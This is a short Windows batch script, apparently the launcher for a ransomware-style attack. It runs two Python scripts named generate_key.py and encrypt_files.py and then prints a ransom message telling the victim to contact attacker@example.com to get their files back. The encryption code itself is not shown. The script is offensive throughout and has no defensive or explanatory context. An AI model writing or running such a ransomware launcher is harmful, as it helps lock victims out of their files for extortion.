@echo off
python generate_key.py
python encrypt_files.py
echo "Your files have been encrypted! Contact attacker@example.com to restore them."
pause
